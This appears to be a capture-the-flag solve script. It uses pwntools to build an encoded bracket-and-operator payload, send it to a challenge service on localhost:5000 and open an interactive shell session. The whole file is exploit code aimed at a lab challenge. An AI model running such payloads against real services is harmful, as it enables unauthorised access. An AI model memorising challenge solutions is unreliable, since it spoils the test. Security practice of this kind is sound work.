from pwn import *

T = '[[[]]>[]][[]>[]]'
code = '--++'.join([T] * 111)
code += '+[-[[]>[]][[]>[]]>[[]>[]][[]>[]]>[]%s...>>[]][[]>[]]' % ('+' * 49)

#io = process(['python', 'chal.py'])
io = remote('localhost', 5000)
io.sendlineafter(b'> ', code.encode())
io.interactive()
